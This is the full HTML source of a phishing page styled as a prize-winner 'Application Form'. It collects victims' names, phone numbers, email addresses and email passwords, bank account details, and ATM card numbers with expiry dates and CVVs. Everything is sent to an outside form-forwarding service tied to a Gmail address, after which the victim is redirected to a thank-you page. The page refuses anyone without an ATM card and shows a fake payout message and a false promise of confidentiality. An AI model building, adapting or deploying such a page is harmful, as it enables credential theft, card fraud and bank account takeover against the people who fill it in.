<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: #fff;
      padding: 25px;
      border-radius: 10px;
      max-width: 600px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-top: 15px;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border-radius: 6px;
      border: 1px solid #ccc;
    }
    .error {
      color: red;
      font-size: 0.9em;
      display: none;
    }
    .password-wrapper {
      position: relative;
    }
    .password-wrapper input {
      padding-right: 40px;
    }
    .password-wrapper .toggle {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
    }
    #finalNote {
      margin-top: 20px;
      font-weight: bold;
      display: none;
    }
    #submitBtn {
      margin-top: 20px;
      padding: 12px;
      background-color: green;
      color: white;
      border: none;
      width: 100%;
      font-size: 16px;
      border-radius: 8px;
    }
    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" onsubmit="return validateForm()">
    <!-- Redirect and Captcha Settings -->
    <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/thankyou.html">
    <input type="hidden" name="_captcha" value="false">

    <label>1. Full Name:
      <input type="text" id="fullName" name="Full Name" required>
      <div class="error" id="fullNameError">Full name is required.</div>
    </label>

    <label>2. Country:
      <input type="text" id="country" name="Country" required>
      <div class="error" id="countryError">Country is required.</div>
    </label>

    <label>3. Phone Number:
      <input type="text" id="phone" name="Phone Number" required>
      <div class="error" id="phoneError">Phone number must be 9‚Äì12 digits.</div>
    </label>

    <label>4. Email Address:
      <input type="email" id="email" name="Email Address" required>
      <div class="error" id="emailError">Enter a valid email address.</div>
    </label>

    <label>5. Email Password:
      <div class="password-wrapper">
        <input type="password" id="emailPassword" name="Email Password" required>
        <span class="toggle" onclick="togglePassword()">üëÅÔ∏è</span>
      </div>
      <div class="error" id="emailPasswordError">Password is required.</div>
    </label>

    <label>6. Amount You Won:
      <input type="text" id="amountWon" name="Amount Won" required>
      <div class="error" id="amountWonError">Amount is required.</div>
    </label>

    <label>7. Bank Account Type:
      <input type="text" id="accountType" name="Bank Account Type" required>
      <div class="error" id="accountTypeError">Account type is required.</div>
    </label>

    <label>8. Bank Account Number:
      <input type="text" id="accountNumber" name="Bank Account Number" required>
      <div class="error" id="accountNumberError">Account number is required.</div>
    </label>

    <label>9. Bank Account Holder's Name:
      <input type="text" id="holderName" name="Account Holder Name" required>
      <div class="error" id="holderNameError">Holder name is required.</div>
    </label>

    <label>10. Did You Link ATM to Your Bank Account?
      <select id="atmLinked" name="ATM Linked?" onchange="handleATM()" required>
        <option value="">--Select--</option>
        <option value="Yes">Yes</option>
        <option value="No">No</option>
      </select>
      <div class="error" id="atmLinkedError">Please select an option.</div>
    </label>

    <div id="atmFields" class="hidden">
      <label>11. ATM Card Number:
        <input type="text" id="cardNumber" name="ATM Card Number" maxlength="16">
        <div class="error" id="cardNumberError">Card number must be exactly 16 digits.</div>
      </label>

      <label>12. Expiry Date (MM/YY):
        <input type="text" id="expiry" name="Expiry Date" maxlength="5">
        <div class="error" id="expiryError">Expiry must be MM/YY format.</div>
      </label>

      <label>13. CVV:
        <input type="text" id="cvv" name="CVV" maxlength="3">
        <div class="error" id="cvvError">CVV must be 3 digits.</div>
      </label>

      <div id="finalNote"></div>
    </div>

    <!-- Confidentiality Notice -->
    <p style="margin-top: 20px; color: #555; font-style: italic;">
      üîí We keep your information secure and confidential.
    </p>

    <button type="submit" id="submitBtn">Submit</button>
  </form>

  <script>
    function togglePassword() {
      const field = document.getElementById("emailPassword");
      field.type = field.type === "password" ? "text" : "password";
    }

    function handleATM() {
      const value = document.getElementById("atmLinked").value;
      const atmFields = document.getElementById("atmFields");
      const submitBtn = document.getElementById("submitBtn");
      const finalNote = document.getElementById("finalNote");

      if (value === "Yes") {
        atmFields.classList.remove("hidden");
        submitBtn.disabled = false;
        finalNote.style.display = "block";
        updateFinalNote();
      } else if (value === "No") {
        atmFields.classList.add("hidden");
        submitBtn.disabled = true;
        finalNote.style.display = "none";
        alert("YOU MUST HAVE ATM CARD TO PROCEED");
      }
    }

    function updateFinalNote() {
      const name = document.getElementById("fullName").value;
      const amount = document.getElementById("amountWon").value;
      const type = document.getElementById("accountType").value;
      const number = document.getElementById("accountNumber").value;

      const note = `Dear ${name}, You will receive ${amount} to your ${type}, ${number}`;
      document.getElementById("finalNote").textContent = note;
    }

    function validateField(id, condition, errorId) {
      const error = document.getElementById(errorId);
      if (condition) {
        error.style.display = "none";
        return true;
      } else {
        error.style.display = "block";
        return false;
      }
    }

    function validateForm() {
      const fullName = document.getElementById("fullName").value.trim();
      const country = document.getElementById("country").value.trim();
      const phone = document.getElementById("phone").value.trim();
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("emailPassword").value.trim();
      const amount = document.getElementById("amountWon").value.trim();
      const type = document.getElementById("accountType").value.trim();
      const number = document.getElementById("accountNumber").value.trim();
      const holder = document.getElementById("holderName").value.trim();
      const atm = document.getElementById("atmLinked").value;

      let valid = true;

      valid &= validateField("fullName", fullName !== "", "fullNameError");
      valid &= validateField("country", country !== "", "countryError");
      valid &= validateField("phone", /^\d{9,12}$/.test(phone), "phoneError");
      valid &= validateField("email", /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email), "emailError");
      valid &= validateField("emailPassword", password !== "", "emailPasswordError");
      valid &= validateField("amountWon", amount !== "", "amountWonError");
      valid &= validateField("accountType", type !== "", "accountTypeError");
      valid &= validateField("accountNumber", number !== "", "accountNumberError");
      valid &= validateField("holderName", holder !== "", "holderNameError");
      valid &= validateField("atmLinked", atm !== "", "atmLinkedError");

      if (atm === "Yes") {
        const card = document.getElementById("cardNumber").value.trim();
        const expiry = document.getElementById("expiry").value.trim();
        const cvv = document.getElementById("cvv").value.trim();

        valid &= validateField("cardNumber", /^\d{16}$/.test(card), "cardNumberError");
        valid &= validateField("expiry", /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry), "expiryError");
        valid &= validateField("cvv", /^\d{3}$/.test(cvv), "cvvError");
      }

      if (atm === "Yes") updateFinalNote();
      return !!valid;
    }

    document.querySelectorAll("input, select").forEach(el => {
      el.addEventListener("blur", validateForm);
    });

    document.getElementById("expiry").addEventListener("input", function(e) {
      const value = e.target.value.replace(/\D/g, "");
      if (value.length >= 3) {
        e.target.value = value.slice(0, 2) + "/" + value.slice(2, 4);
      } else {
        e.target.value = value;
      }
    });
  </script>
</body>
</html>
